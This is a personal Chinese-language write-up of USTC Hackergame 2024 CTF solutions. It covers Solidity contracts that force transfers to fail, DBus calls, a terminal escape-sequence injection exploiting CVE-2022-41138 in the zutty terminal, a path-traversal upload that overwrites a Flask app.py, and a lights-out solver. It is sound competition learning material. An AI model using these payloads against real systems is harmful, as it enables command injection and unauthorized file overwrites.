我们需要知道 Solidity / EVM 的一些知识。一个合约可以通过 `fallback` 和 `receive` 函数在没有匹配的函数签名时接收以太币，类似于一个钩子函数。

如果我们在 `receive` 函数中报错，那么这笔交易就会失败，从而导致所有的转账失败。我们可以通过 [`revert`](https://docs.soliditylang.org/en/v0.8.28/control-structures.html#revert-statement) 来回退交易。

```solidity
// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;

contract Sink {
    receive() external payable {
        revert();
    }
}
```

其实最考验的是如何测试合约。可以通过下面的命令编译合约，并拿到字节码。（记得把 `0x` 去掉）

```bash
forge build my-flag1.sol
jq -r .bytecode.object < ./out/my-flag1.sol/Sink.json
```

- `flag{Tr4nsf3r_T0_c0nTracT_MaY_R3v3rt_??????????}`

### 转账又失败

我们通过 diff 看到 `challenge1.sol` 和 `challenge2.sol` 的区别，发现了多了 `(bool success, ) = ` 来处理转账失败的情况。所以我就搜了下，还有什么可能会导致合约执行失败。

想想在其他语言中，如果不显式的 throw error，还有什么可能会导致函数执行失败呢？最简单的就是死循环。

```solidity
// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;

contract Sink {
    receive() external payable {
        while (true) {}
    }
}
```

_（感谢 Copilot 的帮助）_

- `flag{Ple4se_L1m1t_y0uR_GAS_HaHa_??????????}`

### 转账再失败

~~？奇怪的题目~~

这下合约限制了 `receive` 函数的 gas，无法在 `receive` 函数中耗尽 gas。经过一番搜索，我发现了一个叫做 `returnbomb` 的东西。通过返回一个很大的数组，可以在外部耗费很多 gas，导致交易失败。

我找到了[一个示例](https://gist.github.com/pcaversaccio/3b487a24922c839df22f925babd3c809)，决定稍作修改。

了解到 [`assembly`](https://docs.soliditylang.org/en/latest/assembly.html) 里面是一个叫做 [Yul](https://docs.soliditylang.org/en/latest/yul.html) 的语言，可以直接操作 EVM 指令。

我先按照示例，用 `revert(0, 10000)` 来测试，发现交易直接 revert 了。然后发现除了 `revert`，`return` 也可以用来返回数据。我们可以通过 `return` 指令来返回数据，第一个参数是返回数据的起始位置，第二个参数是返回数据的长度。

我先试了 `10000`，发现交易仍然成功了。后来发现了个平台 [Tenderly](https://tenderly.co/)，可以用来调试合约。我发现 gas 还是有剩余的，但是如果返回的数据太大，就会导致 `receive` 函数调用失败。所以我就一直增加返回数据的长度，直到整体交易失败。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.9.0;

contract Sink {
    receive() external payable {
        assembly {
            // 50000 + 25000 - 25000 + 12500 - 12500 + 6250 + 3125 - 3125 + 1562 + 500
            return(0, 58312)
        }
    }
}
```

- `flag{Y0u_4re_Th3_M4sTeR_0f_EVM!!!_??????????}`

## 不太分布式的软总线

题目说了一大堆，一句没听懂。让我们有请，ChatGPT！

GPT 告诉我可以用 `dbus-send` 和 `gdbus` 来调用 DBus 方法。

我们可以先用 `gdbus introspect` 看看有哪些方法和参数，可以在 `flagserver.c` 找到下面的参数（其实 C 代码也写方法了，但这个比较直观）。

```
gdbus introspect --system --dest cn.edu.ustc.lug.hack.FlagService --object-path /cn/edu/ustc/lug/hack/FlagService
```

### What DBus Gonna Do?

我们就直接调用 `GetFlag1` 方法就行了吧！

```bash
gdbus call --system \
           --dest cn.edu.ustc.lug.hack.FlagService \
           --object-path /cn/edu/ustc/lug/hack/FlagService \
           --method cn.edu.ustc.lug.hack.FlagService.GetFlag1

Error: GDBus.Error:org.freedesktop.DBus.Error.InvalidArgs: Type of message, ?()?, does not match expected type ?(s)?
```

噢不行，还需要传递一个参数。看了下 C 代码，需要 `Please give me flag1` 作为参数。然后问了下 GPT 怎么传递参数。

```bash
gdbus call --system \
           --dest cn.edu.ustc.lug.hack.FlagService \
           --object-path /cn/edu/ustc/lug/hack/FlagService \
           --method cn.edu.ustc.lug.hack.FlagService.GetFlag1 \
           "Please give me flag1"
```

- `flag{every_11nuxdeskT0pU5er_uSeDBUS_bUtn0NeknOwh0w_??????????}`

### If I Could Be A File Descriptor

在 `flagserver.c` 中，我们可以看到 `GetFlag2` 方法，它需要一个文件描述符作为参数。文件描述符要怎么在 bash 中创建呢？问 GPT 吧！

```bash
exec 3</path/to/file
```

好，说干就干！

```bash
touch /tmp/a
exec 3</tmp/a
gdbus call --system \
           --dest cn.edu.ustc.lug.hack.FlagService \
           --object-path /cn/edu/ustc/lug/hack/FlagService \
           --method cn.edu.ustc.lug.hack.FlagService.GetFlag2 \
           3

Error: GDBus.Error:org.gtk.GDBus.UnmappedGError.Quark._g_2dio_2derror_2dquark.Code3: Please don't give me a file on disk to trick me!
```

🌚 不让用文件？！通过[这篇文章](https://yushuaige.github.io/2020/08/14/%E5%BD%BB%E5%BA%95%E5%BC%84%E6%87%82%20Linux%20%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88fd%EF%BC%89/)了解到，不仅只有硬盘上的文件可以有文件描述符，stdin/out 也有，所以让 GPT 帮我写了个匿名管道并创建文件描述符。

```bash
{
  echo "Please give me flag2" | {
    gdbus call --system \
               --dest cn.edu.ustc.lug.hack.FlagService \
               --object-path /cn/edu/ustc/lug/hack/FlagService \
               --method cn.edu.ustc.lug.hack.FlagService.GetFlag2 \
               3
  } 3<&0
} 3<&1
```

- `flag{n5tw0rk_TrAnSpaR5Ncy_d0n0t_11k5_Fd_??????????}`

### Comm Say Maybe

我们先直接调用 `GetFlag3` 方法试试

```bash
gdbus call --system \
           --dest cn.edu.ustc.lug.hack.FlagService \
           --object-path /cn/edu/ustc/lug/hack/FlagService \
           --method cn.edu.ustc.lug.hack.FlagService.GetFlag3
Error: GDBus.Error:org.gtk.GDBus.UnmappedGError.Quark._g_2dio_2derror_2dquark.Code3: You shall use getflag3 to call me!
```

看来要用 `getflag3` 来调用。在 `flagserver.c` 可以看到，它通过读取 `/proc/<pid>/comm` 来获得进程名。如果不是 `getflag3`，就会返回错误。

这里我用的办法比较朴实，直接重新编译 `getflag3`，但是添加一行代码把 flag 打印出来。

```c
g_print("%s\n", flag);
```

然后拿 Docker 编译出来，转换成 base64。最后在我们的脚本里，把原来的 `getflag3` 替换成 base64 后的代码。

```bash
#!/bin/bash

base64 -d <<< "<base64 data>" > /dev/shm/getflag3

chmod +x /dev/shm/getflag3
/dev/shm/getflag3
```

- `flag{prprprprprCTL_15your_FRiEND_??????????}`

## RISC-V：虎胆龙威

不会，跳过。

参考[官方题解](https://github.com/USTC-Hackergame/hackergame2024-writeups/tree/master/official/RISC-V%EF%BC%9A%E8%99%8E%E8%83%86%E9%BE%99%E5%A8%81)。

## 动画分享

这题让我肝了一个半通宵 🫠。

### 只要不停下 HTTP 服务，响应就会不断延伸

第一题想了很久，因为一开始方向是第二题的。想着如何让程序退出。后来本地调试的时候发现，server 经常卡住。原来这个 Rust 程序是单线程的。如果当前的请求没有处理完，后面的请求就会被阻塞。

但是我们该如何让我们的程序还在运行，但是让检测程序认为我们的程序已经退出了呢？我们可以通过 [`daemon(3)`](https://man7.org/linux/man-pages/man3/daemon.3.html) 函数来实现。

```rust
use nix::unistd::daemon;
use nix::unistd::sleep;

fn main() {
    let stream = std::net::TcpStream::connect("127.0.0.1:8000").unwrap();
    println!("done");
    daemon(false, false).unwrap();
    sleep(1000);
}
```

这里使用了 [nix](https://crates.io/crates/nix) 包来调用系统调用。

- `flag{wa1t_no0O0oooO_mY_b1azIngfA5t_raust_f11r5erVer_??????????}`

### 希望的终端模拟器，连接着我们的羁绊

这一题做的我绝望了。我把 Rust 的 `fileserver` 看了八百遍都没发现可能会 panic 的地方。（但其实看到别人说可以通过在 URL 传入 `\x80` 导致 panic）。

首先，我们注意到题目上注明了「几年前编译的某祖传终端模拟器」，而且 `Dockerfile` 特地编译安装了 `0.12` 版本的 `zutty`。所以我们可以猜测这个终端模拟器可能有问题。

通过 `zutty cve` 可以找到 [CVE-2022-41138](https://nvd.nist.gov/vuln/detail/CVE-2022-41138)，从而进一步找到它的 [POC](https://bugs.gentoo.org/868495)。

进一步挖掘我了解到 `DECRQSS` 是一个什么东西，然后找到了 [这篇文章](https://dgl.cx/2023/09/ansi-terminal-security#mintty-osc50)。几乎是把答案甩在我脸上了。

我构造了一个字符串，它会模拟在 `zutty` 中按 Ctrl-C 并执行 `cat /flag2 > /flag3`。

```
printf "\e[0m\eP\$q\x3\e\\ \eP\$qm\rcat /flag2 > /flag3\r\e\\ \eP\$qm\e\\ "
```

然后我把这个字符串放到 URL 中，就可以拿到 flag 了……吗？？？

```rust
use std::{fs, io::Write, net::TcpStream, thread::sleep};

fn main() {
    let header = b"GET /";
    let res: [u8; 18] = [
        27, 91, 48, 109, 27, 80, 36, 113, 3, 27, 92, 32, 27, 80, 36, 113, 109, 13,
    ];
    let command = b"cat /flag2 > /flag3";
    let res2: &[u8; 12] = &[13, 27, 92, 32, 27, 80, 36, 113, 109, 27, 92, 32];
    let bytes = [header.as_ref(), &res, command, res2].concat();

    let mut stream = TcpStream::connect("127.0.0.1:8000").unwrap();
    stream.write_all(&bytes).unwrap();

    sleep(std::time::Duration::from_secs(1));

    let res = fs::read("/flag3").unwrap();
    let flag = String::from_utf8_lossy(&res);
    println!("{}", flag);
}
```

在本地 Docker 运行这个程序，我们可以拿到 flag。但是在比赛环境，它报错了！

```
called `Result::unwrap()` on an `Err` value: Os { code: 2, kind: NotFound, message: "No such file or directory" }
```

不知道为什么这题会出现 Docker 本地环境 和比赛环境不一致的情况。但把路径换成了 `/tmp/flag3` 就可以了。🤦

所以我们一次性可以拿到两个 flag，不过第一个 flag 我们已经拿到了。

- `flag{xterm_&_DECRQSS_in_2008_0NcE_morE_??????????}`

## LESS 文件查看器在线版

做不出来，看了题解，感觉和 Web 没半毛钱关系，但是分到了 Web 类。

参考[官方题解](https://github.com/USTC-Hackergame/hackergame2024-writeups/tree/master/official/LESS%20%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8%E5%9C%A8%E7%BA%BF%E7%89%88)。

## 关灯

GPT 的高光时刻，我算了一个通宵都没做出来，好几张草稿纸。但是重新调整了一下 GPT 的提示词，就帮我解出来了。

### Easy

通过 GPT 得到的代码，稍作修改，即可得到以下程序。

```python
def get_answer(lights_string):
    # Convert the lights array string back to numpy array
    lights_array = np.array(list(map(int, lights_string)), dtype=np.uint8).reshape(
        n, n, n
    )

    # Create the coefficient matrix for the linear system
    A = np.zeros((n**3, n**3), dtype=np.uint8)

    def index(x, y, z):
        return x * n * n + y * n + z

    for x in range(n):
        for y in range(n):
            for z in range(n):
                idx = index(x, y, z)
                A[idx, idx] = 1
                if x > 0:
                    A[idx, index(x - 1, y, z)] ^= 1
                if x < n - 1:
                    A[idx, index(x + 1, y, z)] ^= 1
                if y > 0:
                    A[idx, index(x, y - 1, z)] ^= 1
                if y < n - 1:
                    A[idx, index(x, y + 1, z)] ^= 1
                if z > 0:
                    A[idx, index(x, y, z - 1)] ^= 1
                if z < n - 1:
                    A[idx, index(x, y, z + 1)] ^= 1

    # Flatten the lights array to get the right-hand side of the equation
    b = lights_array.flatten()

    # Solve the linear system A * x = b in GF(2)
    # We will use Gaussian elimination in GF(2)
    A = A.astype(np.bool_)
    b = b.astype(np.bool_)

    # Gaussian elimination
    for i in range(n**3):
        if not A[i, i]:
            for j in range(i + 1, n**3):
                if A[j, i]:
                    A[[i, j]] = A[[j, i]]
                    b[[i, j]] = b[[j, i]]
                    break
        for j in range(i + 1, n**3):
            if A[j, i]:
                A[j] ^= A[i]
                b[j] ^= b[i]

    x = np.zeros(n**3, dtype=np.bool_)
    for i in range(n**3 - 1, -1, -1):
        if b[i]:
            x[i] = 1
            for j in range(i):
                if A[j, i]:
                    b[j] ^= 1

    # Convert the solution back to the required format
    switch_array = x.astype(np.uint8).reshape(n, n, n)
    answer = "".join(map(str, switch_array.flatten().tolist()))

    return answer

n = 3
print(get_answer("111001001111101000001101010"))
```

- `flag{bru7e_f0rce_1s_a1l_y0u_n3ed_??????????}`

### Medium

同上，把 `n` 改为 5。

- `flag{prun1ng_1s_u5eful_??????????}`

### Hard

同上，把 `n` 改为 11。

- `flag{lin3ar_alg3bra_1s_p0werful_??????????}`

### Impossible

做不出来，n = 149 会电脑爆炸。

参考[官方题解](https://github.com/USTC-Hackergame/hackergame2024-writeups/tree/master/official/%E5%85%B3%E7%81%AF)。

## 禁止内卷

好简单的题，但是放到这么后，还以为很难。

通过题目可知，`--reload` 热重载是开启了的，所以我们应该找到 Flask 主入口的文件。根据[文档](https://flask.palletsprojects.com/en/stable/quickstart/)，我们推测文件名为 `app.py`。然后就想办法让 `app.py` 被修改。

我们先抓包，随便传一个文件。根据代码可知，我们的文件是上传到 `/tmp/uploads` 的，而网站的代码在 `/tmp/web`，所以我们把文件名改为 `../web/app.py`。至于内容，我们把题目中的代码保存下来，再改一改。

```python
@app.route("/", methods=["GET"])
def index():
    return open("answers.json").read()
```

再次访问题目页面，内容已经是原始的 `answers.json` 了。拿到 answers 稍微做个转换就能得出 flag 了。

```js
const answers = [
  // ...
]
answers.map((n) => String.fromCharCode(n + 65)).join('')
```

- `flag{uno!!!!_esrever_now_U_run_MY_??????????????}`

## 先不说关于我从零开始独自在异世界……

题目好长……

### 「行吧就算标题可以很长但是 flag 一定要短点」

脏活累活纯靠 GPT，没有技术含量……

### 「就算你把我说的话全出成题目也不会赢得我的好感的哼」

杀了我吧，不会 😥

## 总结

这是我第二次正式参加 CTF。这次比赛开始时，我正好在日本旅行，特地抽出了一天时间来专门做 CTF（峰值排名第四名 🤣）。回国之后又折腾了一天才回到家，期间睡眠严重不足。直到比赛结束前 3 个小时，我才放弃解题，去睡觉了。肝是挺肝的，但乐在其中。不过我已经把我能解出来的题都解出来了，没什么好遗憾的。篇幅有限，其实还省略了挺多研究时候的尝试。期待下次~~肝~~比赛。

作为一个非常业余的 CTFer，能取得这样的成绩对我来说挺好的了。~~不枉我从小当脚本小子。~~

#### 一些碎碎念

不论是 GeekGame 还是 HackerGame，感觉对 ARM macOS 不是很友好。「不宽的宽字符」和「动画分享」都花了我巨多时间来准备环境。

> [!TIP]
> 好在大部分的题目，都可以正常地使用 OrbStack 模拟 x86 环境跑起来。
>
> ```bash
> docker build --platform linux/amd64 .
> ```

> [!TIP]
> 在 macOS 上构建 x86 Linux 的 Rust 程序，可以用 [`cross`](https://github.com/cross-rs/cross)。

P.S 以后有 CTF 组队可以喊我一起。（如果我有空的话）

## 版权声明

Copyright (c) [三咲智子 Kevin Deng](https://github.com/sxzz). All rights reserved.

<a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="知识共享许可协议" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png" /></a><br />本作品题解部分与未特别标注的源代码部分采用<a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>进行许可，特别标注的部分以标注的许可协议进行许可。
